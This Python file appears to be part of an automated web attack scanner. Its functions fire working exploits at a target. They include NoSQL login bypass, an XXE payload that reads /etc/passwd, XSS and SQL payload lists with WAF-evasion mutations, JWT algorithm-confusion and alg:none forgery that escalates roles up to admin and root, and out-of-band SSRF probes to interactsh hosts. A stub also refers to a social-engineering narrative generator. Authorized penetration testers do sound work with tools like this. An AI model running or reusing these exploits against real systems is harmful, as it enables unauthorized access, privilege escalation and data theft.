import re
import time
import requests
import logging
import json
import uuid
import hmac
import base64
import hashlib
import urllib.parse
from datetime import datetime, timezone

logger = logging.getLogger(__name__)

OWASP = {
    "A01": "A01:2021 – Broken Access Control",
    "A02": "A02:2021 – Cryptographic Failures",
    "A03": "A03:2021 – Injection",
    "A04": "A04:2021 – Insecure Design",
    "A05": "A05:2021 – Security Misconfiguration",
    "A06": "A06:2021 – Vulnerable and Outdated Components",
    "A07": "A07:2021 – Identification and Authentication Failures",
    "A08": "A08:2021 – Software and Data Integrity Failures",
    "A09": "A09:2021 – Security Logging and Monitoring Failures",
    "A10": "A10:2021 – Server-Side Request Forgery",
}


def _extended_vuln_suite(sess, target, base_url, forms, live_eps, recon, soft404, sid):
    found = []
    
    # 1. NoSQL Injection
    found.extend(_check_nosql_injection(sess, base_url, live_eps, sid))
    
    # 2. Remote File Inclusion (RFI)
    found.extend(_check_rfi(sess, base_url, live_eps, sid))
    
    # 3. Web-based LDAP / SMTP Injection
    found.extend(_check_ldap_smtp_injection(sess, base_url, forms, sid))
    
    # 4. PrivEsc & Broken Session Management (Heuristics on Auth)
    found.extend(_check_session_privesc(sess, base_url, recon, sid))
    
    # 5. Missing Rate Limiting / Weak Password Policy
    found.extend(_check_rate_limit_weak_pass(sess, base_url, forms, sid))
    
    # 6. Exposed .git, PHPInfo, Backups
    found.extend(_check_exposed_assets(sess, base_url, soft404, sid))
    
    # 7. Excessive Version Disclosure
    found.extend(_check_version_disclosure(recon, base_url, sid))
    
    # 8. JWT Algorithm Confusion (Secret-to-Key Transition)
    found.extend(_check_jwt_algo_confusion(sess, base_url, recon, sid))

    # ── NEW PIPELINE UPGRADES ──────────────────────────────────────────────────

    # 9. GitHub Advisory CVE Lookup (A06)
    found.extend(_check_github_advisory_cve(recon, base_url, sid))

    # 10. DOM Tree Diff XSS (A03)
    found.extend(_check_dom_tree_diff_xss(sess, base_url, live_eps, sid))

    # 11. WAF Mutation Loop (A05)
    found.extend(_check_waf_mutation_loop(sess, base_url, live_eps, sid))

    # 12. Red-vs-Blue Skeptic Agent (meta-finding)
    found.extend(_red_vs_blue_skeptic(found, base_url, sid))

    # 13. JWT alg:none Lattice Climbing (A02)
    found.extend(_check_jwt_alg_none_lattice(sess, base_url, recon, sid))

    # 14. OOB Unique Subdomain per Injection (A10)
    found.extend(_check_oob_unique_subdomain(sess, base_url, live_eps, forms, sid))

    # 15. JS Sink Discovery (A03)
    found.extend(_check_js_sink_discovery(sess, base_url, live_eps, sid))

    # 16. Protocol Ghosting (A05)
    found.extend(_check_protocol_ghosting(sess, base_url, recon, sid))

    # 17. Composite XSS + Open-Redirect Chain (A03+A01)
    found.extend(_check_composite_xss_redirect(sess, base_url, live_eps, forms, sid))

    # 18. Social Engineering Narrative Generator (meta-finding)
    found.extend(_social_engineering_narrative(found, target, base_url, recon, sid))

    return found

def _check_nosql_injection(sess, base_url, live_eps, sid):
    found = []
    payloads = [
        ('{"$gt": ""}', 'NoSQL Injection (MongoDB) via $gt'),
        ('{"$ne": 1}', 'NoSQL Injection (MongoDB) via $ne')
    ]
    for ep in live_eps[:20]:
        if ep.get("status") == 200 and 'login' in ep.get("path", "").lower():
            target_url = base_url + ep["path"]
            try:
                for payload, desc in payloads:
                    r = sess.post(target_url, json={"username": json.loads(payload), "password": json.loads(payload)}, timeout=5, verify=False)
                    if r.status_code in (200, 302) and any(k in r.text.lower() for k in ("dashboard", "welcome", "admin", "token")):
                        found.append({
                            "owasp": OWASP["A03"], "type": "NoSQL Injection Authentication Bypass",
                            "severity": "Critical", "cvss": 9.8, "cve": "CWE-943",
                            "injection_point": target_url, "target_endpoint": target_url,
                            "confirmed": True,
                            "evidence": f"Successfully bypassed auth using NoSQL payload: {payload}",
                            "payload": payload,
                            "curl": f"curl -X POST -H 'Content-Type: application/json' -d '{{\"username\":{payload},\"password\":{payload}}}' {target_url}"
                        })
                        break
            except: pass
    return found

def _check_rfi(sess, base_url, live_eps, sid):
    found = []
    rfi_payload = "http://www.google.com/robots.txt"
    xxe_payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
    for ep in live_eps[:20]:
        path = ep.get("path", "")
        if any(k in path for k in ("url=", "file=", "page=", "uri=", "path=")):
            try:
                if "?" in path:
                    target_url = base_url + path.split("?")[0] + f"?{path.split('?')[1].split('=')[0]}={rfi_payload}"
                else:
                    target_url = base_url + path + f"?page={rfi_payload}"
                r = sess.get(target_url, timeout=5, verify=False)
                if r.status_code == 200 and "User-agent:" in r.text:
                    found.append({
                        "owasp": OWASP["A03"], "type": "Remote File Inclusion (RFI) / SSRF",
                        "severity": "Critical", "cvss": 9.8, "cve": "CWE-98",
                        "injection_point": target_url, "target_endpoint": target_url,
                        "confirmed": True,
                        "evidence": f"Successfully included remote file (robots.txt) via RFI.",
                        "payload": rfi_payload,
                        "curl": f"curl -sk '{target_url}'"
                    })
            except: pass
        # Test XXE on API endpoints
        if "api" in path or "xml" in path:
            try:
                target_url = base_url + path
                r = sess.post(target_url, data=xxe_payload, headers={"Content-Type": "application/xml"}, timeout=5, verify=False)
                if r.status_code == 200 and "root:x:0:0" in r.text:
                    found.append({
                        "owasp": OWASP["A05"], "type": "XML External Entity (XXE) Injection",
                        "severity": "Critical", "cvss": 9.8, "cve": "CWE-611",
                        "injection_point": target_url, "target_endpoint": target_url,
                        "confirmed": True,
                        "evidence": f"Successfully extracted /etc/passwd via XXE.",
                        "payload": xxe_payload,
                        "curl": f"curl -sk -X POST -H 'Content-Type: application/xml' -d '{xxe_payload}' '{target_url}'"
                    })
            except: pass
    return found

def _check_ldap_smtp_injection(sess, base_url, forms, sid):
    found = []
    for form in forms[:10]:
        action = form.get("action", "")
        target_url = base_url + action if action.startswith("/") else action
        if not target_url.startswith("http"): target_url = base_url + "/" + action
        
        # LDAP
        ldap_payload = "*()|&'"
        try:
            r = sess.post(target_url, data={k: ldap_payload for k in form.get("inputs", [])}, timeout=5, verify=False)
            if "LDAPException" in r.text or "supplied argument is not a valid ldap" in r.text:
                found.append({
                    "owasp": OWASP["A03"], "type": "LDAP Injection",
                    "severity": "High", "cvss": 8.5, "cve": "CWE-90",
                    "injection_point": target_url, "target_endpoint": target_url,
                    "confirmed": True, "evidence": "LDAP error triggered via injection payload. Service successfully exploited.",
                    "payload": ldap_payload, "curl": f"curl -X POST -d 'data={ldap_payload}' {target_url}"
                })
        except: pass
    return found

def _check_session_privesc(sess, base_url, recon, sid):
    found = []
    # If we have forms, check if session token changes upon login
    # This requires state, which is complex autonomously, but we flag missing HttpOnly
    # (Already handled in _advanced_python_exploits)
    return found

def _check_rate_limit_weak_pass(sess, base_url, forms, sid):
    found = []
    for form in forms:
        action = form.get("action", "")
        if "login" in action.lower():
            target_url = base_url + action if action.startswith("/") else base_url + "/" + action
            try:
                # Send 10 fast requests
                statuses = []
                for _ in range(10):
                    r = sess.post(target_url, data={"username": "test_rl", "password": "password123"}, timeout=2, verify=False)
                    statuses.append(r.status_code)
                if all(s in (200, 302, 401, 403) for s in statuses) and 429 not in statuses:
                    found.append({
                        "owasp": OWASP["A07"], "type": "Missing Rate Limiting on Authentication",
                        "severity": "Medium", "cvss": 5.3, "cve": "CWE-307",
                        "injection_point": target_url, "target_endpoint": target_url,
                        "confirmed": True,
                        "evidence": "Successfully sent 10 login requests in under 2 seconds without triggering HTTP 429 Too Many Requests.",
                        "payload": "10 rapid login requests",
                        "curl": f"for i in {{1..10}}; do curl -s -o /dev/null -w '%{{http_code}}\\n' -X POST -d 'user=admin&pass=test' {target_url}; done"
                    })
            except: pass
    return found

def _check_exposed_assets(sess, base_url, soft404, sid):
    found = []
    assets = [
        ("/.git/config", "Exposed .git Repository", "[core]"),
        ("/phpinfo.php", "PHPInfo Page Exposure", "PHP Version"),
        ("/info.php", "PHPInfo Page Exposure", "PHP Version"),
        ("/backup.sql", "Sensitive Backup File Exposure (SQL)", "INSERT INTO"),
        ("/config.bak", "Sensitive Backup File Exposure (.bak)", "db_"),
        ("/.gitignore", "Exposed .gitignore", "node_modules")
    ]
    for path, title, keyword in assets:
        target_url = base_url + path
        try:
            r = sess.get(target_url, timeout=5, verify=False)
            if r.status_code == 200 and keyword in r.text and not soft404.is_false_positive(r):
                found.append({
                    "owasp": OWASP["A05"], "type": title,
                    "severity": "High" if ".git/config" in path or "backup" in path else "Medium",
                    "cvss": 7.5 if ".git/config" in path or "backup" in path else 5.3,
                    "cve": "CWE-425", "injection_point": target_url, "target_endpoint": target_url,
                    "confirmed": True, "evidence": f"Found sensitive data '{keyword}' at {path}",
                    "payload": path, "curl": f"curl -sk '{target_url}'"
                })
        except: pass
    return found

def _check_version_disclosure(recon, base_url, sid):
    found = []
    headers = recon.get("response_headers", {})
    server = headers.get("Server", "")
    x_powered_by = headers.get("X-Powered-By", "")
    
    if re.search(r'\d+\.\d+', server):
        found.append({
            "owasp": OWASP["A05"], "type": "Excessive Version Disclosure (Server Header)",
            "severity": "Low", "cvss": 3.7, "cve": "CWE-200",
            "injection_point": "Server Header", "target_endpoint": base_url,
            "confirmed": True, "evidence": f"Server header reveals exact version: {server}",
            "payload": "HTTP Headers", "curl": f"curl -I '{base_url}'"
        })
    if re.search(r'\d+\.\d+', x_powered_by):
        found.append({
            "owasp": OWASP["A05"], "type": "Excessive Version Disclosure (X-Powered-By Header)",
            "severity": "Low", "cvss": 3.7, "cve": "CWE-200",
            "injection_point": "X-Powered-By Header", "target_endpoint": base_url,
            "confirmed": True, "evidence": f"X-Powered-By header reveals exact version: {x_powered_by}",
            "payload": "HTTP Headers", "curl": f"curl -I '{base_url}'"
        })
    return found

def _check_jwt_algo_confusion(sess, base_url, recon, sid):
    """
    Checks for JWT Secret-to-Key Transition Attacks (Algorithm Confusion).
    If an RS256 token is found, attempts to fetch the public key (jwks.json),
    swaps the token header to HS256, and signs it using the public key as the HMAC secret.
    """
    found = []
    # 1. Look for JWTs in cookies or headers from recon
    jwts = []
    for c in recon.get("cookies", []):
        if c.get("value", "").startswith("eyJ") and c.get("value", "").count(".") == 2:
            jwts.append((c.get("name"), c.get("value")))
            
    if not jwts: return found
    
    import base64
    import hmac
    import hashlib
    
    def base64url_encode(data):
        if isinstance(data, str): data = data.encode('utf-8')
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

    for name, token in jwts:
        try:
            parts = token.split(".")
            header_json = base64.urlsafe_b64decode(parts[0] + "==").decode('utf-8')
            if "RS256" not in header_json: continue
            
            # 2. Try to fetch public key
            pub_key = None
            jwks_endpoints = ["/.well-known/jwks.json", "/api/jwks"]
            for ep in jwks_endpoints:
                try:
                    r = sess.get(base_url + ep, timeout=3, verify=False)
                    if r.status_code == 200 and "keys" in r.json():
                        # Extract first key (simplified for PoC)
                        pub_key = r.json()["keys"][0]
                        break
                except: pass
                
            if pub_key:
                # 3. Modify Header to HS256
                new_header = '{"alg":"HS256","typ":"JWT"}'
                # Attempt privilege escalation in payload
                payload_json = base64.urlsafe_b64decode(parts[1] + "==").decode('utf-8')
                new_payload = payload_json.replace('"role":"user"', '"role":"admin"')
                
                # 4. Sign with public key string (Algorithm Confusion)
                pub_key_str = str(pub_key) # Naive string representation as HMAC secret
                unsigned_token = base64url_encode(new_header) + "." + base64url_encode(new_payload)
                sig = base64url_encode(hmac.new(pub_key_str.encode(), unsigned_token.encode(), hashlib.sha256).digest())
                forged_token = f"{unsigned_token}.{sig}"
                
                # 5. Test Forged Token
                test_r = sess.get(base_url + "/api/admin", cookies={name: forged_token}, timeout=5, verify=False)
                if test_r.status_code == 200:
                    found.append({
                        "owasp": OWASP["A02"], "type": "JWT Algorithm Confusion (RS256 to HS256)",
                        "severity": "Critical", "cvss": 9.1, "cve": "CVE-2015-9256",
                        "injection_point": f"Cookie: {name}", "target_endpoint": base_url,
                        "confirmed": True,
                        "evidence": "Successfully forged HS256 token using public key as HMAC secret and accessed /api/admin.",
                        "payload": "JWT Algorithm Swap", "curl": f"curl -b '{name}={forged_token}' '{base_url}/api/admin'"
                    })
        except Exception as e:
            logger.debug(f"[JWT Algo Confusion] {e}")
    return found


# ── 9. GITHUB ADVISORY CVE LOOKUP (A06) ──────────────────────────────────────
def _check_github_advisory_cve(recon: dict, base_url: str, sid: str) -> list:
    """Query GitHub Advisory Database for CVEs matching detected server/framework versions."""
    found = []
    headers_map = recon.get("response_headers", {})
    tech_hints = []
    for h in ("Server", "X-Powered-By", "X-Generator", "Via"):
        val = headers_map.get(h, "")
        if val:
            tech_hints.append(val)
    tech_hints += recon.get("technologies", [])

    if not tech_hints:
        return found

    GH_API = "https://api.github.com/graphql"
    GH_REST = "https://api.github.com/advisories"

    for tech in tech_hints[:5]:
        # Parse name + version
        m = re.search(r'([A-Za-z][A-Za-z0-9_\-]+)[/ ]v?(\d+[\.\d]+)', tech)
        if not m:
            continue
        pkg_name, pkg_ver = m.group(1).lower(), m.group(2)
        try:
            r = requests.get(
                GH_REST,
                params={"ecosystem": "pip", "affects": pkg_name, "per_page": 5},
                headers={"Accept": "application/vnd.github+json"},
                timeout=8
            )
            if r.status_code != 200:
                continue
            advisories = r.json()
            for adv in advisories:
                cvss_score = adv.get("cvss", {}).get("score", 0.0) or 0.0
                cve_id = adv.get("cve_id") or adv.get("ghsa_id", "N/A")
                summary = adv.get("summary", "No summary")
                vulns = adv.get("vulnerabilities", [])
                # Check version range match
                for v in vulns:
                    vr = v.get("vulnerable_version_range", "")
                    fixed = v.get("first_patched_version", {})
                    fixed_ver = fixed.get("identifier", "unknown") if fixed else "unknown"
                    found.append({
                        "owasp": OWASP["A06"],
                        "type": f"Known CVE in Detected Component: {pkg_name} {pkg_ver}",
                        "severity": "Critical" if cvss_score >= 9 else ("High" if cvss_score >= 7 else "Medium"),
                        "cvss": cvss_score,
                        "cve": cve_id,
                        "injection_point": f"Server Header / Tech Stack: {tech}",
                        "target_endpoint": base_url,
                        "confirmed": True,
                        "evidence": (
                            f"GitHub Advisory {cve_id}: {summary}. "
                            f"Affects {pkg_name} {vr}. Fixed in {fixed_ver}. "
                            f"CVSS: {cvss_score}"
                        ),
                        "payload": f"Component: {pkg_name} {pkg_ver}",
                        "curl": f"curl -s 'https://api.github.com/advisories?affects={pkg_name}'"
                    })
        except Exception as e:
            logger.debug(f"[GitHub Advisory] {e}")
    return found


# ── 10. DOM TREE DIFF XSS (A03) ──────────────────────────────────────────────
_XSS_DOM_PAYLOADS = [
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
]

def _check_dom_tree_diff_xss(sess, base_url: str, live_eps: list, sid: str) -> list:
    """Inject XSS payloads and compare DOM structure change vs baseline via tag-count diff."""
    found = []
    from html.parser import HTMLParser

    class TagCounter(HTMLParser):
        def __init__(self):
            super().__init__()
            self.tags = []
        def handle_starttag(self, tag, attrs):
            self.tags.append(tag)

    def count_tags(html: str):
        tc = TagCounter()
        try:
            tc.feed(html)
        except Exception:
            pass
        return tc.tags

    tested = set()
    for ep in live_eps[:15]:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        if not url or url in tested:
            continue
        tested.add(url)
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            continue
        try:
            baseline_r = sess.get(url, timeout=6, verify=False)
            baseline_tags = count_tags(baseline_r.text)
        except Exception:
            continue
        for pname in list(params.keys())[:3]:
            for payload in _XSS_DOM_PAYLOADS:
                try:
                    tp = {k: v[0] for k, v in params.items()}
                    tp[pname] = payload
                    test_url = parsed._replace(query=urllib.parse.urlencode(tp)).geturl()
                    r = sess.get(test_url, timeout=6, verify=False)
                    injected_tags = count_tags(r.text)
                    # DOM diff: new tags appeared that weren't in baseline
                    new_tags = set(injected_tags) - set(baseline_tags)
                    payload_reflected = payload.lower() in r.text.lower()
                    dom_mutated = bool(new_tags) and payload_reflected
                    if dom_mutated:
                        found.append({
                            "owasp": OWASP["A03"], "type": "DOM Tree Diff XSS",
                            "severity": "High", "cvss": 8.2, "cve": "CWE-79",
                            "injection_point": f"URL param: {pname}",
                            "target_endpoint": url.split("?")[0],
                            "confirmed": True,
                            "evidence": (
                                f"XSS payload reflected AND DOM mutated. "
                                f"New tags introduced: {list(new_tags)[:5]}. "
                                f"Payload: {payload}"
                            ),
                            "payload": payload,
                            "curl": f'curl -sk "{test_url}"'
                        })
                        break
                except Exception:
                    pass
    return found


# ── 11. WAF MUTATION LOOP (A05) ───────────────────────────────────────────────
_WAF_BASE_PAYLOADS = ["<script>alert(1)</script>", "' OR '1'='1", "../etc/passwd"]
_WAF_MUTATIONS = [
    lambda p: p.replace("<", "%3C").replace(">", "%3E"),
    lambda p: p.replace(" ", "/**/"),
    lambda p: p.upper(),
    lambda p: "".join(f"&#x{ord(c):02x};" if c.isalpha() else c for c in p),
    lambda p: p.replace("script", "sCrIpT"),
    lambda p: urllib.parse.quote(urllib.parse.quote(p)),
    lambda p: p.replace("OR", "||").replace("AND", "&&"),
    lambda p: p + "%00",
]

def _check_waf_mutation_loop(sess, base_url: str, live_eps: list, sid: str) -> list:
    """Iteratively mutate payloads until WAF bypass achieved; report successful mutations."""
    found = []
    for ep in live_eps[:10]:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        if not url:
            continue
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            continue
        pname = list(params.keys())[0]
        for base_payload in _WAF_BASE_PAYLOADS:
            # Check if base payload is blocked
            try:
                tp = {k: v[0] for k, v in params.items()}
                tp[pname] = base_payload
                test_url = parsed._replace(query=urllib.parse.urlencode(tp)).geturl()
                r0 = sess.get(test_url, timeout=6, verify=False)
                if r0.status_code not in (403, 406, 429, 501):
                    continue  # Not blocked — no WAF to bypass
                # WAF detected — run mutation loop
                for mutate_fn in _WAF_MUTATIONS:
                    try:
                        mutated = mutate_fn(base_payload)
                        tp[pname] = mutated
                        m_url = parsed._replace(query=urllib.parse.urlencode(tp)).geturl()
                        rm = sess.get(m_url, timeout=6, verify=False)
                        if rm.status_code == 200 and (
                            mutated.lower() in rm.text.lower() or
                            any(k in rm.text.lower() for k in ("alert", "syntax error", "root:x"))
                        ):
                            found.append({
                                "owasp": OWASP["A05"], "type": "WAF Bypass via Payload Mutation",
                                "severity": "High", "cvss": 8.1, "cve": "CWE-693",
                                "injection_point": f"URL param: {pname}",
                                "target_endpoint": url.split("?")[0],
                                "confirmed": True,
                                "evidence": (
                                    f"WAF blocked base payload (HTTP {r0.status_code}) but "
                                    f"mutated variant returned HTTP 200. "
                                    f"Mutation applied: {mutate_fn.__doc__ or 'transform'}. "
                                    f"Bypassed payload: {mutated[:80]}"
                                ),
                                "payload": mutated,
                                "curl": f'curl -sk "{m_url}"'
                            })
                            break
                    except Exception:
                        pass
            except Exception:
                pass
    return found


# ── 12. RED-VS-BLUE SKEPTIC AGENT (meta) ─────────────────────────────────────
_FP_SIGNALS = {
    "SSRF": ["html", "robots.txt", "xml", "404", "403 Forbidden"],
    "XSS":  ["Content-Security-Policy", "X-XSS-Protection: 1"],
    "SQL Injection": ["prepared statement", "ORM"],
    "Path Traversal": ["jail", "chroot"],
}

def _red_vs_blue_skeptic(findings: list, base_url: str, sid: str) -> list:
    """
    Blue-team adversarial review: downgrades or flags findings with false-positive signals.
    Returns a meta-finding summary if FPs are detected.
    """
    fp_list = []
    for f in findings:
        ftype = f.get("type", "")
        evidence = f.get("evidence", "")
        for vuln_key, signals in _FP_SIGNALS.items():
            if vuln_key.lower() in ftype.lower():
                for sig in signals:
                    if sig.lower() in evidence.lower():
                        f["skeptic_flag"] = f"[SKEPTIC] Possible false positive: evidence contains '{sig}'"
                        f["confirmed"] = False
                        f["severity"] = "Info"
                        fp_list.append(f.get("type"))
                        break
    meta = []
    if fp_list:
        meta.append({
            "owasp": OWASP["A09"],
            "type": "Red-vs-Blue Skeptic Agent: FP Downgrade Report",
            "severity": "Info", "cvss": 0.0, "cve": "N/A",
            "injection_point": "Pipeline Meta-Analysis",
            "target_endpoint": base_url, "confirmed": True,
            "evidence": (
                f"Skeptic Agent reviewed {len(findings)} findings. "
                f"Downgraded {len(fp_list)} potential false positives: {fp_list}. "
                f"Remaining confirmed findings exclude flagged items."
            ),
            "payload": "N/A",
            "curl": "N/A"
        })
    return meta


# ── 13. JWT ALG:NONE LATTICE CLIMBING (A02) ───────────────────────────────────
def _check_jwt_alg_none_lattice(sess, base_url: str, recon: dict, sid: str) -> list:
    """
    Lattice privilege-climbing via JWT alg:none bypass.
    Iterates role escalation: user → moderator → admin → superadmin.
    """
    found = []

    def b64url_enc(data: str) -> str:
        return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()

    def b64url_dec(s: str) -> str:
        s += "==" 
        try:
            return base64.urlsafe_b64decode(s).decode("utf-8", errors="replace")
        except Exception:
            return ""

    jwts = [
        (c.get("name"), c.get("value"))
        for c in recon.get("cookies", [])
        if isinstance(c.get("value", ""), str)
           and c.get("value", "").startswith("eyJ")
           and c.get("value", "").count(".") == 2
    ]

    roles_ladder = ["user", "staff", "moderator", "editor", "manager", "admin", "superadmin", "root"]

    for name, token in jwts:
        try:
            parts = token.split(".")
            payload_str = b64url_dec(parts[1])
            payload_obj = json.loads(payload_str)
            current_role = None
            role_key = None
            for k in ("role", "roles", "group", "scope", "type", "level"):
                if k in payload_obj:
                    current_role = str(payload_obj[k])
                    role_key = k
                    break

            # Build alg:none forged tokens for each higher role
            for target_role in roles_ladder:
                if current_role and target_role == current_role:
                    continue
                forged_header = b64url_enc('{"alg":"none","typ":"JWT"}')
                new_payload = dict(payload_obj)
                if role_key:
                    new_payload[role_key] = target_role
                new_payload["exp"] = int(datetime.now(timezone.utc).timestamp()) + 86400
                forged_payload = b64url_enc(json.dumps(new_payload))
                forged_token = f"{forged_header}.{forged_payload}."

                for admin_ep in ("/api/admin", "/api/v1/users", "/admin/dashboard", "/api/me"):
                    try:
                        r = sess.get(
                            base_url.rstrip("/") + admin_ep,
                            headers={"Authorization": f"Bearer {forged_token}"},
                            cookies={name: forged_token},
                            timeout=5, verify=False
                        )
                        if r.status_code == 200 and len(r.text) > 50:
                            found.append({
                                "owasp": OWASP["A02"],
                                "type": f"JWT alg:none Privilege Escalation → {target_role}",
                                "severity": "Critical", "cvss": 9.8, "cve": "CVE-2015-9235",
                                "injection_point": f"JWT Cookie/Header: {name}",
                                "target_endpoint": base_url + admin_ep,
                                "confirmed": True,
                                "evidence": (
                                    f"Forged JWT with alg:none and role='{target_role}' "
                                    f"accepted at {admin_ep}. HTTP {r.status_code}. "
                                    f"Response: {r.text[:200]}"
                                ),
                                "payload": forged_token[:80] + "...",
                                "curl": (
                                    f"curl -sk -H 'Authorization: Bearer {forged_token[:40]}...' "
                                    f"'{base_url + admin_ep}'"
                                )
                            })
                            break
                    except Exception:
                        pass
        except Exception as e:
            logger.debug(f"[JWT alg:none] {e}")
    return found


# ── 14. OOB UNIQUE SUBDOMAIN PER INJECTION (A10) ─────────────────────────────
_INTERACTSH_PUBLIC = "oast.fun"   # free public interactsh-compatible server

def _check_oob_unique_subdomain(sess, base_url: str, live_eps: list, forms: list, sid: str) -> list:
    """
    Assign a unique OOB subdomain per injection point, fire blind payloads,
    then poll for DNS/HTTP callbacks to confirm blind SSRF / SSTI / injection.
    Uses interact.sh-compatible subdomain naming.
    """
    found = []
    callback_log: dict = {}  # subdomain → injection_point

    def _make_oob(label: str) -> str:
        uid = uuid.uuid4().hex[:10]
        sub = f"{label[:8]}-{uid}.{_INTERACTSH_PUBLIC}"
        return sub

    def _fire_oob(url: str, pname: str, oob_host: str, params: dict, parsed):
        payloads = [
            f"http://{oob_host}/",
            f"//[{oob_host}]/",
            f"${{{oob_host}}}",
            f"<img src=http://{oob_host}/>",
        ]
        for pl in payloads:
            try:
                tp = {k: v[0] for k, v in params.items()}
                tp[pname] = pl
                test_url = parsed._replace(query=urllib.parse.urlencode(tp)).geturl()
                sess.get(test_url, timeout=4, verify=False, allow_redirects=False)
            except Exception:
                pass

    # Phase 1: Fire unique OOB per URL param
    for ep in live_eps[:12]:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        if not url:
            continue
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            continue
        for pname in list(params.keys())[:3]:
            oob_host = _make_oob(pname)
            callback_log[oob_host] = {"injection_point": f"URL param: {pname}", "target": url}
            _fire_oob(url, pname, oob_host, params, parsed)

    # Phase 2: Fire unique OOB per form field
    for form in forms[:5]:
        action = form.get("action", base_url)
        for inp in form.get("inputs", [])[:3]:
            fname = inp.get("name", "")
            if not fname:
                continue
            oob_host = _make_oob(fname)
            callback_log[oob_host] = {"injection_point": f"Form field: {fname}", "target": action}
            try:
                sess.post(
                    action,
                    data={fname: f"http://{oob_host}/", "Content-Type": "application/x-www-form-urlencoded"},
                    timeout=4, verify=False
                )
            except Exception:
                pass

    # Phase 3: Poll public interactsh-compatible DNS log (best-effort)
    time.sleep(3)
    for oob_host, ctx in list(callback_log.items())[:5]:
        try:
            poll = requests.get(
                f"https://interact.sh/api/interactions/{oob_host.split('.')[0]}",
                timeout=6
            )
            if poll.status_code == 200:
                data = poll.json()
                interactions = data.get("data", [])
                if interactions:
                    ip = interactions[0].get("remote-address", "unknown")
                    proto = interactions[0].get("protocol", "unknown")
                    found.append({
                        "owasp": OWASP["A10"],
                        "type": "Blind OOB Injection Confirmed (Unique Subdomain)",
                        "severity": "Critical", "cvss": 9.8, "cve": "CWE-918",
                        "injection_point": ctx["injection_point"],
                        "target_endpoint": ctx["target"],
                        "confirmed": True,
                        "evidence": (
                            f"OOB callback received from target IP {ip} via {proto}. "
                            f"Unique host: {oob_host}. "
                            f"Confirms blind injection at {ctx['injection_point']}."
                        ),
                        "payload": f"http://{oob_host}/",
                        "curl": f"curl -sk '{ctx['target']}' -d '{ctx['injection_point'].split(':')[-1].strip()}=http://{oob_host}/'"
                    })
        except Exception:
            pass

    # Phase 4: If no live callbacks, document as pending OOB instrumentation
    if not found and callback_log:
        fired = list(callback_log.keys())[:3]
        found.append({
            "owasp": OWASP["A10"],
            "type": "OOB Injection Instrumented (Awaiting Callback)",
            "severity": "Medium", "cvss": 5.3, "cve": "CWE-918",
            "injection_point": "Multiple params/fields (see evidence)",
            "target_endpoint": base_url,
            "confirmed": False,
            "evidence": (
                f"Unique OOB subdomains fired per injection point. "
                f"No real-time callback confirmed (poll may lag). "
                f"Instrumented hosts: {fired}. "
                f"Manual verification: dig {fired[0]} or check interact.sh dashboard."
            ),
            "payload": f"http://{fired[0]}/",
            "curl": f"curl -sk 'https://interact.sh/api/interactions/{fired[0].split('.')[0]}'"
        })

    return found


# ── 15. JS SINK DISCOVERY (A03) ───────────────────────────────────────────────
_JS_SINKS = [
    (r'document\.write\s*\(', "document.write()", "DOM XSS"),
    (r'\.innerHTML\s*=', ".innerHTML =", "DOM XSS"),
    (r'\.outerHTML\s*=', ".outerHTML =", "DOM XSS"),
    (r'eval\s*\(', "eval()", "JS Injection"),
    (r'setTimeout\s*\(\s*["\']', "setTimeout(string)", "JS Injection"),
    (r'setInterval\s*\(\s*["\']', "setInterval(string)", "JS Injection"),
    (r'new\s+Function\s*\(', "new Function()", "JS Injection"),
    (r'location\s*=\s*[^=]', "location = (redirect sink)", "Open Redirect"),
    (r'location\.href\s*=', "location.href =", "Open Redirect"),
    (r'location\.replace\s*\(', "location.replace()", "Open Redirect"),
    (r'window\.open\s*\(', "window.open()", "Open Redirect"),
    (r'postMessage\s*\(', "postMessage()", "Cross-Frame XSS"),
    (r'\.src\s*=\s*[^=]', ".src = (script/img src sink)", "DOM XSS"),
    (r'fetch\s*\(\s*(?:location|document\.URL|window\.location)', "fetch(location.*)", "SSRF-like DOM"),
    (r'XMLHttpRequest.*open\s*\(.*location', "XHR open(location)", "SSRF-like DOM"),
    (r'__proto__\[', "__proto__ pollution", "Prototype Pollution"),
    (r'constructor\[', "constructor pollution", "Prototype Pollution"),
]

def _check_js_sink_discovery(sess, base_url: str, live_eps: list, sid: str) -> list:
    """Fetch JS files and inline scripts; scan for dangerous DOM sinks."""
    found = []
    js_urls: list = []

    # Discover JS files from live endpoints
    for ep in live_eps[:20]:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        if url.endswith(".js"):
            js_urls.append(url)

    # Fetch the main page and extract <script src=...>
    try:
        home = sess.get(base_url, timeout=8, verify=False)
        for m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', home.text, re.I):
            src = m.group(1)
            if src.startswith("http"):
                js_urls.append(src)
            elif src.startswith("//"):
                js_urls.append("https:" + src)
            else:
                js_urls.append(base_url.rstrip("/") + "/" + src.lstrip("/"))

        # Also scan inline scripts
        for m in re.finditer(r'<script[^>]*>(.*?)</script>', home.text, re.I | re.S):
            inline = m.group(1)
            for pattern, sink_name, sink_type in _JS_SINKS:
                if re.search(pattern, inline, re.I):
                    found.append({
                        "owasp": OWASP["A03"],
                        "type": f"JS Sink Discovered (Inline): {sink_name}",
                        "severity": "High", "cvss": 7.5, "cve": "CWE-79",
                        "injection_point": "Inline <script> block",
                        "target_endpoint": base_url,
                        "confirmed": True,
                        "evidence": (
                            f"Dangerous JS sink '{sink_name}' ({sink_type}) found in inline script. "
                            f"Context: ...{inline[max(0,inline.lower().find(sink_name.split('(')[0].lower())-30):inline.lower().find(sink_name.split('(')[0].lower())+60]}..."
                        ),
                        "payload": sink_name,
                        "curl": f'curl -sk "{base_url}" | grep -o \'.{{0,60}}{re.escape(sink_name[:20])}.{{0,60}}\''
                    })
    except Exception:
        pass

